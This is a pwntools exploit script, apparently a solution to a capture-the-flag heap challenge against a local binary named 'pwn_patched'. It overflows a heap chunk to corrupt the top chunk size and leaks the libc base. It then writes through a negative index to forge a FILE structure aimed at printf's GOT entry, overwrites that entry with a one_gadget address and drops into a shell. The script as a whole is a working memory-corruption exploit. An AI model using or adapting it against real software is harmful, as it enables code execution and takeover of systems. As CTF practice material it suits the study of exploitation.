from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    p = process("./pwn_patched")
    #p = remote(remote_addr[0], remote_addr[1])
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']


r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def menu(idx):
    sla(b'chioce:', str(idx).encode())

def add(idx, size, content):
    menu(1)
    sla(b':\n', str(idx).encode())
    sla(b':\n', str(size).encode())
    sa(b':\n', content)

def edit(idx, size, content):
    menu(2)
    sla(b':\n', str(idx).encode())
    sla(b':\n', str(size).encode())
    sa(b':\n', content)

def show(idx):
    menu(3)
    sla(b':\n', str(idx).encode())

gdb.attach(p)

add(1, 0x3f0, b'aaaa')
edit(1, -1, b'\x00' * 0x3f8 + p64(0xc01))

add(2, 0x1000, b'/bin/sh\x00')
add(3, 0x3f0, b'\x00')
show(3)

libc.address = u64(ru(b'\x7f').ljust(8, b'\x00')) - 0x3c5100
pr('libc_base', libc.address)
io_list_all = libc.sym['_IO_list_all']
main_arena_88 = libc.sym['main_arena'] + 88
system_addr = libc.sym['system']

one = libc.address + 0xf03a4
printf_got = 0x602030
payload = p64(0xfbad208b) + p64(0) * 6 + p64(printf_got) + p64(printf_got + 8)

edit(-22, 0x90, payload)

s(p64(one))


shell()
